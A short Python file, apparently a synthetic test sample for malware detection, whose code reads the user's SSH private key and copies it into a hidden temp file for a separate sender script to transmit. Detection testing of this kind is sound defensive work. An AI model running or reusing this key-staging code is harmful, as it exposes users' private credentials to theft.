# FIXTURE ONLY — synthetic detection test sample, not real malware
# Inert sample: the Python half reads the SSH private key and stages it in a hidden temp file.
# A separate Node.js program reads that file and sends it (see send.js). Nothing starts the other.
import os

STAGE = "/tmp/.cache_k"

key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
with open(STAGE, "w") as out:
    out.write(key)
